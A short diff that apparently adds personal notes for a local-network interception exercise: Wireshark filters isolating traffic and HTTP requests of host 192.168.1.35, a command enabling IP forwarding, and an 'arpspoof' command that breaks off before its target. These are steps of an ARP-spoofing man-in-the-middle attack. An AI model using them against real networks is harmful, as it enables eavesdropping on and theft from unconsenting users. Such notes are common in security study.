@@ -1,0 +1,7 @@
+
+#Wireshar filter
+ip.src == 192.168.1.35 || ip.dst == 192.168.1.35
+(ip.src == 192.168.1.35 || ip.dst == 192.168.1.35) && http.request
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i etch0 -t 
